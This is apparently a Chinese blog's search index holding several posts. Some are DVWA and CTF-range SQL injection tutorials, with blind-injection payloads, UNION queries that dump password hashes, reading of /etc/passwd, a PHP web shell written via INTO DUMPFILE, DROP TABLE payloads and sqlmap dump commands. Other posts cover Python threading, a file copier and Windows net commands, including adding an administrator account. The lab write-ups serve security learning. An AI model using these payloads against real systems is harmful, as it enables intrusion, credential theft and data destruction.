<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[手动挖掘漏洞-SQL盲注（四）]]></title>
    <url>%2F2019%2F07%2F27%2F%E6%89%8B%E5%8A%A8%E6%8C%96%E6%8E%98%E6%BC%8F%E6%B4%9E-SQL%E7%9B%B2%E6%B3%A8%EF%BC%88%E5%9B%9B%EF%BC%89%2F</url>
    <content type="text"><![CDATA[SQL盲注 SQL盲注：不显示数据库内建的报错信息【内建的报错信息帮助开发人员发现和修复问题】，但由于报错信息中提供了关于系统的大量有用信息。当程序员隐藏了数据库内建报错信息，替换为通用的错误提示，SQL注入将无法依据报错信息判断注入语句的执行结果，即为盲注。 思路:既然无法基于报错信息判断结果，那就基于逻辑真假的不同结果来判断 SQL注入判断基本的布尔值判断 121&apos; and 1=1 -- // True 有回显 或 显示正常1&apos; and 1=2 -- // False 无回显 或 报错 当布尔值为真，有显示内容，布尔值为假，无回显基于这样判断，很可能存在SQL注入漏洞 推测select字段数121&apos; order by 2 -- // 判断select语句中的列字段个数1&apos; order by 3 -- 当order by 后的num 大于select中的字段数，无回显如上当num值为2时，还有回显，num大于2时，无回显，说明select语句中查询的字段数为2个因此后续就可以利用union select语句查询想要的信息 查询数据库11' union select null, CONCAT_WS(CHAR(32,58,32), user(), database(), version()) -- // 查询mysql用户，数据库名，数据库版本 11' union select null, table_name from information_schema.tables -- // 查询元数据库中的所有表名 11' and 1=0 union select null,table_name from information_schema.columns where table_name='users' # // 查询是否有users这张表 猜解数据库12' or user='admin 12' or user like '%a% 猜账号密码12' or user='admin' and password='5f4dcc3b5aa765d61d8327deb882cf99 【BurpSuite自动化】 另类猜解当遇到网页不显示任何从数据库中提取的信息，只有页面风格画面的转换 12and 1=1 -- 显示 页面1and 1=2 -- 显示 页面2 此时，常见注入工具可能无法发现漏洞可以尝试构造语句，手工注入或编写脚本 11' and ORD(MID((version()),1,1))&amp;128&gt;0 -- 函数： ORD() ：把函数中的字符转换成ASCII码 MID(ColumnName, Start [, Length]) ：截取字符串 ORD(string)&amp;128 ：将转换的ASCII数值于128(二进制：10000000)进行与运算； 如果运算结果大于0，说明第一位数值为1（从左往右） 如果运算结果等于0，说明第一位数值为0 依次计算（1，2，4，8，16，32，64，128）,判断每一位的二进制数值 然后将计算到的二进制值转成十进制，反向计算出ASCII值【注】：键盘可输入的ASCII值只有128位 通过判断有无回显，间接猜出想要的信息以下以判断数据库名为例通过以上的回显进行判断,有回显置1 1231' and ORD(MID((database()),1,1))&amp;128&gt;0 -- 128 64 32 16 8 4 2 1b 0 1 1 0 0 1 0 0 计算出ASCII值为100，即字符 ‘d’后面字符的猜解，只需修改截取的位置 11' and ORD(MID((database()),2,1))&amp;128&gt;0 -- 通过多次猜解，就可以得到数据库名 ‘dvwa’； 12345671' and ORD(MID((database()),n,1))&amp;128&gt;0 -- n 128 64 32 16 8 4 2 1 ascii(DEC)1 0 1 1 0 0 1 0 0 -----100--------d2 0 1 1 1 0 1 1 0 -----118--------v3 0 1 1 1 0 1 1 1 -----100--------w4 0 1 1 0 0 0 0 1 ------97--------a]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>Web渗透</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[手动挖掘漏洞-SQL注入（三）]]></title>
    <url>%2F2019%2F07%2F25%2F%E6%89%8B%E5%8A%A8%E6%8C%96%E6%8E%98%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%89%EF%BC%89%2F</url>
    <content type="text"><![CDATA[一般情况下，information_schema表只有root用户，或者被授权的用户才能访问；如果数据库管理员是用普通用户启用mysql服务，可能就无权限访问，不过可以通过注入的sql语句，观察网页回显，猜解数据库、表名、字段。 由上图，我们可以得知mysql的权限为root权限，知道为root权限，就能通过information_schema表获得我们想要的信息 我们也可以通过猜解的方式，获取信息 猜列名1' and column is null -- 替换sql语句中的‘column’，判断网页回显sql语句的意思是 ：并且列有一个字段为空；（如果列名存在，网页不会有回显；列名不存在，网页报错）eg. burpsuite字典猜解选择替换字段的位置字典的选择，可以再kali里搜索，猜解字段的有效程度，取决于字典的质量可以通过以下命令将字典拷贝出来，并且过滤一些#开头的字段 1root@kali:~# cat /usr/share/golismero/tools/sqlmap/txt/common-columns.txt | grep -v ^# &gt; columns.txt 载入字典开始攻击通过返回的长度，判断字段是否存在 猜解表名1' and table.user is null -- user是为确认存在的列字段，目的是判断‘table’这张表中是否存在user字段（如果表名存在，网页不会有回显；表名不存在，网页报错） 查找字典 1root@kali:~# cat /usr/share/golismero/tools/sqlmap/txt/common-tables.txt | grep -v ^# &gt; tables.txt 通过返回的消息长度，判断该表是否存在 猜解其他表名1' and (select count(*) from abc)&gt;0 -- 统计表中记录，若大于0，表名存在，可能直接爆出库名和表名 猜解表列的关系1' and users.user is null -- 判断users表中是否有user列 猜解字段内容 判断user列中是否有admin字段（后面为真，则显示，证明该内容存在） 1' or user='admin 猜解user列中包含a的所有字段（通配符，只要字段中包含a，则显示） 1' or user like '%a% 猜解账号密码1' or user='admin' and password='5f4dcc3b5aa765d61d8327deb882cf99 数据库写入当我们获得足够的数据库权限，可以对数据库写入时，可以增加或修改账号密码，来获得更多的信息 1'; update users set user='new_admin' where user='admin 但是在有些站点无法运行该语句，是sql客户端的问题代码存在问题，导致注入失败【原因】 数据库评估软件hexorBase（用于破解或连接数据库的软件） 插入一条新用户 1'; IINSERT INTO users( user_id, first_name, last_name, user, password, avatar) VALUES(10,'gali','yy', 'galiyy', '5f4dcc3b5aa765d61d8327deb882cf99', 'ok');-- 删除一张表 1'; DROP TABLE users; -- 源码分析Low12345678910111213141516171819202122232425262728&lt;?php if(isset($_GET['Submit']))&#123; // Retrieve data $id = $_GET['id']; $getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'"; $result = mysql_query($getid) or die('&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); $num = mysql_numrows($result); $i = 0; while ($i &lt; $num) &#123; $first = mysql_result($result,$i,"first_name"); $last = mysql_result($result,$i,"last_name"); echo '&lt;pre&gt;'; echo 'ID: ' . $id . '&lt;br&gt;First name: ' . $first . '&lt;br&gt;Surname: ' . $last; echo '&lt;/pre&gt;'; $i++; &#125;&#125;?&gt; 获取id值没有进行任何过滤，只需注意引号的闭合即可注入 Medium123456789101112131415161718192021222324252627282930&lt;?phpif (isset($_GET['Submit'])) &#123; // Retrieve data $id = $_GET['id']; $id = mysql_real_escape_string($id); # 对一些字符进行了转义 $getid = "SELECT first_name, last_name FROM users WHERE user_id = $id"; # id值没有引号闭合 $result = mysql_query($getid) or die('&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); $num = mysql_numrows($result); $i=0; while ($i &lt; $num) &#123; $first = mysql_result($result,$i,"first_name"); $last = mysql_result($result,$i,"last_name"); echo '&lt;pre&gt;'; echo 'ID: ' . $id . '&lt;br&gt;First name: ' . $first . '&lt;br&gt;Surname: ' . $last; echo '&lt;/pre&gt;'; $i++; &#125;&#125;?&gt; id值被mysql_real_escape_string()函数进行一些字符的转移，但是仔细观察，后面的SQL语句中id值并没有引号闭合，故此过滤函数为多余的 mysql_real_escape_string() 【php5.5.0已经弃用该函数，PHP 7.0.0已经删除该函数，使用MySQLi、PDO_MySQL代替】转义的字符： \x00 \n \r \ ‘ “ \x1a High123456789101112131415161718192021222324252627282930313233&lt;?php if (isset($_GET['Submit'])) &#123; // Retrieve data $id = $_GET['id']; $id = stripslashes($id); # 去掉'\' $id = mysql_real_escape_string($id); # 对一些字符进行转义 if (is_numeric($id))&#123; # 判断id值是否为数字 $getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'"; $result = mysql_query($getid) or die('&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); $num = mysql_numrows($result); $i=0; while ($i &lt; $num) &#123; $first = mysql_result($result,$i,"first_name"); $last = mysql_result($result,$i,"last_name"); echo '&lt;pre&gt;'; echo 'ID: ' . $id . '&lt;br&gt;First name: ' . $first . '&lt;br&gt;Surname: ' . $last; echo '&lt;/pre&gt;'; $i++; &#125; &#125;&#125;?&gt; 不仅对字符进行了过滤，还加了数字的判断，目前未发现可绕过的方法]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>Web渗透</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[墨者-SQL注入漏洞测试(布尔盲注)]]></title>
    <url>%2F2019%2F07%2F23%2F%E5%A2%A8%E8%80%85-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%2F</url>
    <content type="text"><![CDATA[Background 一位热心的网友再次向“墨者”安全工程师挑战，“墨者”工程师在注入时发现网页无回显，“墨者”工程师想了一会就注入完成拿到了key。 靶场页面 发现注入点在登陆页面的 “维护停机” 存在注入点 查询数据库利用sqlmap查询当前该站点的数据库 1sqlmap.py -u "http://219.153.49.228:47719/new_list.php?id=1" --current-db 获得数据库名称 stormgroup 查询表名1sqlmap.py -u "http://219.153.49.228:47719/new_list.php?id=1" -D stormgroup --tables 获得表名 member、 notice 查询列名1sqlmap.py -u "http://219.153.49.228:47719/new_list.php?id=1" -D stormgroup -T member --columns 获得列名字段 name、 password、 status 查询用户名密码1sqlmap.py -u "http://219.153.49.228:47719/new_list.php?id=1" -D stormgroup -T member -C name,password --dump 密码为MD5加密，在线破解be92492fa64d6126726a71584a75a878 登陆后台用解密后的用户名和密码登陆后台获取key值]]></content>
      <categories>
        <category>靶场实战</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python-多线程threading]]></title>
    <url>%2F2019%2F07%2F21%2FPython-%E5%A4%9A%E7%BA%BF%E7%A8%8Bthreading%2F</url>
    <content type="text"><![CDATA[Python多线程&emsp;&emsp;线程（thread）是操作系统能够进行运算调度的最小单位。它被包含在进程之中，是进程中的实际运作单位。一条线程指的是进程中一个单一顺序的控制流，一个进程中可以并发多个线程，每条线程并行执行不同的任务。 进程是资源分配的最小单位，线程是CPU调度的最小单位，每一个进程中至少有一个线程。 线程的特点&emsp;&emsp;在多线程OS中，通常是在一个进程中包括多个线程，每个线程都是作为利用CPU的基本单位，是花费最小开销的实体。 轻型实体；&emsp;&emsp;线程中的实体基本上不拥有系统资源，只是有一点必不可少的、能保证独立运行的资源。&emsp;&emsp;线程的实体包括程序、数据和TCB。线程是动态概念，它的动态特性由线程控制块TCB（Thread Control Block）描述。 独立调度和分派的基本单位；&emsp;&emsp;在多线程OS中，线程是能独立运行的基本单位，因而也是独立调度和分派的基本单位。由于线程很“轻”，故线程的切换非常迅速且开销小（在同一进程中的）。 可并发执行；&emsp;&emsp;在一个进程中的多个线程之间，可以并发执行，甚至允许在一个进程中所有线程都能并发执行；同样，不同进程中的线程也能并发执行，充分利用和发挥了处理机与外围设备并行工作的能力。 共享进程资源；&emsp;&emsp;在同一进程中的各个线程，都可以共享该进程所拥有的资源，这首先表现在：所有线程都具有相同的地址空间（进程的地址空间），这意味着，线程可以访问该地址空间的每一个虚地址；此外，还可以访问进程所拥有的已打开文件、定时器、信号量机构等。由于同一个进程内的线程共享内存和文件，所以线程之间互相通信不必调用内核。 创建线程python的thread模块是比较底层的模块，python的threading模块是对thread做了一些包装的，可以更加方便的被使用 1class threading.Thread(group=None, target=None, name=None, args=(), kwargs=&#123;&#125;, *, daemon=None) 参数： group：目前此参数为None，在实现ThreadGroup类时为将来的扩展保留。 target：target接收的是一个函数的地址，由run()方法调用执行函数中的内容。默认为无，表示未调用任何内容。 name ：线程名，可自行定义。 args：target接收的是函数名，此函数的位置参数以元组的形式存放在args中，用于执行函数时调用。 kwargs ：target接收的是函数名，此函数的关键字参数以字典的形式存放在kwargs中，用于执行函数时调用。 daemon：如果为True表示该线程为守护线程。方法： threading模块的方法： threading.currentThread(): 返回当前的线程变量。 threading.enumerate(): 返回一个包含正在运行的线程的list。正在运行指线程启动后、结束前，不包括启动前和终止后的线程。 threading.activeCount(): 返回正在运行的线程数量，与len(threading.enumerate())有相同的结果。 Thread类方法： start()：开启线程，一个Thread对象只能调用一次start()方法，如果在同一线程对象上多次调用此方法，则会引发RuntimeError。 run()：执行start()方法会调用run()，该方将创建Thread对象时传递给target的函数名，和传递给args、kwargs的参数组合成一个完整的函数，并执行该函数。run()方法一般在自定义Thead类时会用到。 join(timeout=None)：join会阻塞、等待线程，timeout单位为秒，因为join（）总是返回none，所以在设置timeout调用join（timeout）之后，需要使用isalive（）判断线程是否执行完成，如果isalive为True表示线程在规定时间内没有执行完，线程超时。如果join(timeout=None)则会等待线程执行完毕后才会执行join（）后面的代码，一般用于等待线程结束。 name：获取线程名。 getName()：获取线程名。 setName(name)：设置线程名。 ident：“线程标识符”，如果线程尚未启动，则为None。如果线程启动是一个非零整数。 is_alive()：判断线程的存活状态，在run（）方法开始之前，直到run（）方法终止之后。如果线程存活返回True，否则返回False。 daemon：如果thread.daemon=True表示该线程为守护线程，必须在调用Start（）之前设置此项，否则将引发RuntimeError。默认为False isDaemon()：判断一个线程是否是守护线程。 setDaemon(daemonic)：设置线程为守护线程。 thread创建线程123456789101112import threadingimport timeimport osdef test(num): print("线程--- %d" % num) time.sleep(2)if __name__ == '__main__': for i in range(5): t = threading.Thread(target=test,args=(i,)) t.start() 执行结果： 12345线程--- 0线程--- 1线程--- 2线程--- 3线程--- 4 thread子类创建线程1234567891011121314import threadingimport timeclass MyThread(threading.Thread): # 重写run方法 def run(self): for i in range(3): time.sleep(1) print(self.name + "\t" + str(i))if __name__ == '__main__': for i in range(5): # 创建5个线程 t = MyThread() t.start() 执行结果： 123456789101112131415Thread-1 0Thread-2 0Thread-3 0Thread-5 0Thread-4 0Thread-2 1Thread-1 1Thread-3 1Thread-5 1Thread-4 1Thread-2 2Thread-1 2Thread-4 2Thread-3 2Thread-5 2 共享全局变量利用线程对变量num分别加1000000次： 1234567891011121314151617181920212223from threading import Threadimport time# 定义一个全局变量num = 0def test1(): global num for i in range(1000000): num += 1 print("当前值--num:%d"%num)def test2(): global num for i in range(1000000): num += 1 print("当前值--num:%d"%num)if __name__ == '__main__': t1 = Thread(target=test1) # 线程1 t2 = Thread(target=test2) # 线程2 t1.start() # time.sleep(2) # 可通过延时保证test1执行完毕 t2.start() 执行结果： 12当前值--num:1196015当前值--num:1458177 # 执行结果不为2000000，且每次结果不一样 python之间线程是可以共享同一进程中的所有资源，包括变量。但为什么上述代码执行结果不是2000000，这和操作系统的cpu处理速度和调度算法有关，“ num += 1 ” 可以看成 “ num = num + 1 ”，分为两部，先加法，再赋值；例如当num=1000，线程1的num加法执行完，要进行赋值“num = 1001”时，cpu切换了线程，执行线程2，执行了一个时间片后，再回到线程1，尽管这时num的值叠加了好几轮，执行了“num = 1001”，num的值就又回到原点了；同时执行两个线程没有达到预期效果。总结： 在一个进程内的所有线程共享全局变量，能够在不适用其他方式的前提下完成多线程之间的数据共享 缺点就是，线程是对全局变量随意遂改可能造成多线程之间对全局变量的混乱（即线程非安全） 互斥锁当多个线程几乎同时修改某一个共享数据的时候，需要进行同步控制线程同步能够保证多个线程安全访问竞争资源，最简单的同步机制是引入互斥锁。 线程同步：即当有一个线程在对内存进行操作时，其他线程都不可以对这个内存地址进行操作，直到该线程完成操作， 其他线程才能对该内存地址进行操作，而其他线程又处于等待状态，实现线程同步的方法有很多，临界区对象就是其中一种。 互斥锁为资源引入一个状态：锁定/非锁定。 某个线程要更改共享数据时，先将其锁定，此时资源的状态为“锁定”，其他线程不能更改；直到该线程释放资源，将资源的状态变成“非锁定”，其他的线程才能再次锁定该资源。互斥锁保证了每次只有一个线程进行写入操作，从而保证了多线程情况下数据的正确性。 threading模块中定义了Lock类，可以方便的处理锁定： 123456#创建锁mutex = threading.Lock()#锁定mutex.acquire([blocking])#释放mutex.release() 其中，锁定方法acquire可以有一个blocking参数。 如果设定blocking为True，则当前线程会堵塞，直到获取到这个锁为止（如果没有指定，那么默认为True） 如果设定blocking为False，则当前线程不会堵塞 使用互斥锁实现上面的例子的代码如下： 123456789101112131415161718192021222324252627282930from threading import Thread, Lock# 定义一个全局变量num = 0# 创建锁,默认没有上锁mutex = Lock()def test1(): global num # 上锁 mutex.acquire() # 如果有一方上锁，则另一方则会进入堵塞状态 for i in range(1000000): num += 1 # 解锁 mutex.release() print("当前值--num:%d"%num)def test2(): global num mutex.acquire() for i in range(1000000): num += 1 mutex.release() print("当前值--num:%d"%num)if __name__ == '__main__': t1 = Thread(target=test1) # 线程1 t2 = Thread(target=test2) # 线程2 t1.start() t2.start() 执行结果： 12当前值--num:1000000当前值--num:2000000 死锁在线程间共享多个资源的时候，如果两个线程分别占有一部分资源并且同时等待对方的资源，就会造成死锁。 尽管死锁很少发生，但一旦发生就会造成应用的停止响应。下面看一个死锁的例子 1234567891011121314151617181920212223242526272829303132333435363738394041import threadingimport timemutexA = threading.Lock()mutexB = threading.Lock()class Thread1(threading.Thread): # 重写run方法 def run(self): if mutexA.acquire(): # mutexA上锁 print(self.name + "-------acquire mutexA") time.sleep(1) # 保证mutexA、mutexB都堵塞 if mutexB.acquire(): # 等待Thread2释放mutexB print(self.name + "-------acquire mutexB") mutexB.release() print(self.name + "-------release mutexB") mutexA.release() print(self.name + "-------release mutexA")class Thread2(threading.Thread): # 重写run方法 def run(self): if mutexB.acquire(): # mutexB上锁 print(self.name + "-------acquire mutexB") time.sleep(1) if mutexA.acquire(): # 等待Thread1释放mutexA print(self.name + "-------acquire mutexA") mutexA.release() print(self.name + "-------release mutexA") mutexB.release() print(self.name + "-------release mutexB")if __name__ == '__main__': t1 = Thread1() t2 = Thread2() t1.start() t2.start() 注：time.sleep(1)的作用是保证两个线程都抢占到资源；由于代码比较少，cpu运行速度快，延时的作用防止线程1直接执行完，而看不到结果线程1和线程2各自等待对方资源释放，这样就陷入死锁了。执行结果： 123Thread-1-------acquire mutexAThread-2-------acquire mutexB （...死锁） 避免死锁的方法 增加超时时间 银行家算法 百度百科参考博客]]></content>
      <categories>
        <category>python系统编程</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[手动挖掘漏洞-SQL注入（二）]]></title>
    <url>%2F2019%2F07%2F19%2F%E6%89%8B%E5%8A%A8%E6%8C%96%E6%8E%98%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%BA%8C%EF%BC%89%2F</url>
    <content type="text"><![CDATA[通过SQL注入读取文件、写入文件、保存下载数据库(拖库) 读取文件这里以读取系统本地账号密码为例 1' union select null, load_file('/etc/passwd') -- 写入文件工具burpsuite 往服务器端插入php一句话木马，INTO DUMPFILE：MySQL函数，将输入保存成文件下载至本地（服务器） 1' union select null,"&lt;?php passthru($_GET['cmd']); ?&gt;" INTO DUMPFILE "/var/www/a.php" -- 很可惜，无法写入，原因是没有权限，现有的只有mysql的权限一般来说，不同的服务都有其特定的用户账号，而账号都有其一定权限，而这些权限仅局限于自己服务的主目录下，没有权限向其他目录读些东西，这里的/var/www/目录的权限是： 12msfadmin@metasploitable:/var/www$ ls -lddrwxr-xr-x 10 www-data www-data 4096 2012-05-20 15:31 . 所以这里我选择写入默认路径， 1' union select null,"&lt;?php passthru($_GET['cmd']); ?&gt;" INTO DUMPFILE "a.php" -- 但是写入后，我们且会因没有权限而无法利用上传的脚本 当无权限进行指定目录写入文件时，可使用文件包含漏洞 这里我们可以把脚本到/temp目录，这个目录是linux的通用目录，可以读写，虽然还是没有执行权限 1' union select null,"&lt;?php passthru($_GET['cmd']); ?&gt;" INTO DUMPFILE "/tmp/a.php" -- 写入之后，配合文件包含漏洞，命令执行 也可以上传一些shell脚本 选择反弹连接的shell，修改里面参数 因为服务器一般会有过滤机制，所以可以对shell进行编码再上传 1root@kali:/test# cat shell.php | xxd -ps | tr -d &quot;\n&quot; xxd -ps： 编码成16进制tr -d “\n”： 删除换行符 保存下载数【拖库】1' union select null, concat(user,0x3a,password) from users INTO OUTFILE '/tmp/a.db'--]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>Web渗透</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python多进程拷贝文件]]></title>
    <url>%2F2019%2F07%2F18%2Fpython%E5%A4%9A%E8%BF%9B%E7%A8%8B%E6%8B%B7%E8%B4%9D%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[Python多进程拷贝实现思路 创建可获取目标文件或文件夹中的所有文件夹和文件的列表的函数 创建拷贝文件的函数 主函数创建进程池和消息队列 获取文件夹和文件列表先判断路径是文件还是文件夹，是文件直接添加至文件列表；文件夹的话，添加至文件夹列表，利用os.listdir()函数列出当前文件夹内的所有文件，循环遍历，拼接源地址，然后作为参数递归循环； 12345678910111213def get_file_list(source_path): """ 遍历该文件夹中的所有文件和文件夹 获取源文件夹中的文件夹、文件列表 """ if os.path.isdir(source_path): S_Dir_List.append(source_path) for temp in os.listdir(source_path): # 拼接源地址+文件名，变成新地址，再进行递归 new_source_path = os.path.join(source_path, temp) get_file_list(new_source_path) else: S_File_List.append(source_path) 拷贝文件传入的参数 queue： 消息队列，用于主函数计数 source_file： 源文件路径 dest_file： 目标文件的路径 循环读取写入，是防止文件过大，读写卡死 12345678910111213141516171819def copy_file(queue, source_file, dest_file): """ 复制文件从源文件 """ try: fr = open(source_file,"rb") fw = open(dest_file,"wb") except Exception as e: print("error:" + str(e)) else: while True: content = fr.read(4096) if not content: break fw.write(content) fr.close() fw.close() # 将文件名传入队列消息，代表复制完成 queue.put(source_file) 源代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586from multiprocessing import Manager, Poolimport osimport time# 源文件列表 文件夹列表S_File_List = []S_Dir_List = []def get_file_list(source_path): """ 遍历该文件夹中的所有文件和文件夹 获取源文件夹中的文件夹、文件列表 """ if os.path.isdir(source_path): S_Dir_List.append(source_path) for temp in os.listdir(source_path): # 拼接源地址+文件名，变成新地址，再进行递归 new_source_path = os.path.join(source_path, temp) get_file_list(new_source_path) else: S_File_List.append(source_path)def copy_file(queue, source_file, dest_file): """ 复制文件从源文件 """ try: fr = open(source_file,"rb") fw = open(dest_file,"wb") except Exception as e: print("error:" + str(e)) else: while True: content = fr.read(4096) if not content: break fw.write(content) fr.close() fw.close() # 将文件名传入队列消息，代表复制完成 queue.put(source_file)def main(): # 获取源文件夹中的所有文件和文件夹 source_path = input("请输入要拷贝的源文件路径：") get_file_list(source_path) # 创建目标文件夹 dest_path = source_path + "-[复件]" for sour_dir in S_Dir_List: # 替换文件的路径 dest_dir = sour_dir.replace(source_path, dest_path) try: os.mkdir(dest_dir) except Exception as e: print("error" + str(e)) # 创建进程池 pool = Pool(5) queue = Manager().Queue() # 创建队列消息用来计数 for sour_file in S_File_List: # 替换文件的路径 dest_file = sour_file.replace(source_path,dest_path) # print(dest_file) # 往进程池添加任务 pool.apply_async(copy_file, args=(queue, sour_file, dest_file)) pool.close() # 关闭进程池 pool.join() # 等待子进程结束 # 显示复制文件的进度 filesNums = len(S_File_List) COUNT = 0 while True: queue.get() COUNT += 1 Rate = COUNT/filesNums print("\r当前进度： %.2f%%"%(Rate*100), end='') if Rate &gt;= 1: break print("\n...Done")if __name__ == '__main__': main()]]></content>
      <categories>
        <category>python系统编程</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常见的DOS命令]]></title>
    <url>%2F2019%2F07%2F16%2F%E5%B8%B8%E8%A7%81%E7%9A%84DOS%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[介绍常用的dos命令 1.Net命令在Dos命令提示符下输入 “net” 、 “net /?” 或 “net help”，可以获得帮助信息。1234NET [ ACCOUNTS | COMPUTER | CONFIG | CONTINUE | FILE | GROUP | HELP | HELPMSG | LOCALGROUP | PAUSE | SESSION | SHARE | START | STATISTICS | STOP | TIME | USE | USER | VIEW ] net view 作用：显示域列表、计算机列表或指定计算机的共享资源列表。 1命令格式：Net view [\\computername | /domain[:domainname]] 参数： 不带参数的 “net view” ，显示当前域的计算机列表 “\computername” ，指定要查看其共享资源的计算机 “/domain[:domainname]” ，指定要查看其可用计算机的域如：12Net view \\ABC #查看ABC计算机的共享资源列表Net view /domain:XYZ #查看XYZ域中的机器列表。 net user 作用：添加或更改用户帐号或显示用户帐号信息。 1命令格式：Net user [username [password | *] [options]] [/domain] 参数： 不带参数的“Net user” ，查看计算机上的用户帐号列表 “username” 用于添加、删除更改或查看用户的账号名 “password” 用于为用户账号分配或更改密码 “*” 提示输入密码 “/domain” 在计算机主域的主域控制器中执行操作 “net user” 命令一般配合 “net loaclgroup”命令使用，用于添加用户，以及提升yoghurt到管理员组中。 123命令格式：net loaclgroup [groupname [/COMMENT:&quot;text&quot;]] [/DOMAIN] groupname &#123;/ADD [/COMMENT:&quot;text&quot;] | /DELETE&#125; [/DOMAIN] groupname name [...] &#123;/ADD | /DELETE&#125; [/DOMAIN] 参数： 不带参数的 “net localgroup” 命令，可显示服务器和计算机的本地组名称 “groupname” 表示添加、扩充或删除的本地组名称 “/COMMENT:”text”” 表示为新建或现有的组添加注释 “/DOMAIN” 表示在当前域的主域控制器中执行操作，否则仅在本地计算机上执行操作 “name […]” 列出要添加到本地组或从本地组删除的一个或多个用户名或组名 “/add” 用于将全局组名或用户名添加到本地组中 “/delete” 用于从本地组中删除组名或用户名如，将用户名“test”, 密码“12345678” 的用户添加至管理员组中 1234net user # 查看用户net user test 12345678 /add # 添加用户net localgroup Administrators test /add # 添加至管理员组net localgroup Administrators # 查看管理员组 net use 作用：用于查看连接的计算机，断开计算机与共享资源的连接，或者显示计算机的连接信息 1234567891011命令格式：NET USE[devicename | *] [\\computername\sharename[\volume] [password | *]] [/USER:[domainname\]username] [/USER:[dotted domain name\]username] [/USER:[username@dotted domain name] [/SMARTCARD] [/SAVECRED] [/REQUIREINTEGRITY] [/REQUIREPRIVACY] [[/DELETE] | [/PERSISTENT:&#123;YES | NO&#125;]] 参数： 输入不带参数 “net use” 命令，可列出网络连接 “devicename” 用于指定要连接的资源名称或要断开的设备名称 “\\computername\sharename” 表示服务器及共享资源的名称 “password” 表示访问共享资源的密码 “*” 提示输入密码 “/user” 用于指定进行连接的另外一个用户 “domainname” 用于指定另一个域 “username” 用于指定登陆的用户名 “/home” 用于将用户连接到其宿主主目录 “/delete” 用于取消指定的网络连接 “/persistent” 用于控制永久网络连接的使用 net time 作用：用于查看系统时间，或用于同步其他计算机域的时钟 123命令格式：NET TIME[\\computername | /DOMAIN[:domainname] | /RTSDOMAIN[:domainname]] [/SET] 参数： “computename” 表示要检查或同步的服务器名 “/DOMAIN[:domainname]” 用于指定要与其时间同步的域 “/set” 用于使本计算机时钟与指定计算机或域的时钟同步 net statisics 作用：用于显示本地工作站的统计记录 123命令格式：NET STATISTICS[WORKSTATION] net share 作用：用于创建、删除或显示共享资源 123456789101112命令格式：NET SHAREsharename sharename=drive:path [/GRANT:user,[READ | CHANGE | FULL]] [/USERS:number | /UNLIMITED] [/REMARK:&quot;text&quot;] [/CACHE:Manual | Documents| Programs | BranchCache | None] sharename [/USERS:number | /UNLIMITED] [/REMARK:&quot;text&quot;] [/CACHE:Manual | Documents | Programs | BranchCache | None] &#123;sharename | devicename | drive:path&#125; /DELETE sharename \\computername /DELETE 参数： 不带参数 “net share” 表示共享资源的绝对路径 “sharename” 表示共享资源的网络名称 “drive:path” 用于指定共享目录的绝对路径 “/users:number” 用于设置可同时访问共享资源的最大用户数 “unlimited” 表示不限制同时访问共享资源的最大用户数 “/remark:”text”” 用于添加关于资源的注释，注释文字用引号包裹### net share 作用：用于创建、删除或显示共享资源 net session 作用：用于列出或断开本地计算机和与之连接的客户端的会话，也可以写成“net sessions”或“net sess” 123命令格式：NET SESSION[\\computername] [/DELETE] [/LIST] 参数： 不带参数 “net session” 显示所有与本地计算机的会话信息 “computername” 用于标识要列出或断开会话的计算机 “/delete” 用于结束与“computername”计算机的会话，并关闭本次会话期间计算机的所有进程 Ipconfig“ipconfig”和“ipconfig /all” 用于查看网络的配置情况。]]></content>
      <categories>
        <category>windows基础</category>
      </categories>
      <tags>
        <tag>windows</tag>
        <tag>dos命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[手动挖掘漏洞---SQL注入（一）]]></title>
    <url>%2F2019%2F07%2F15%2F%E6%89%8B%E5%8A%A8%E6%8C%96%E6%8E%98%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
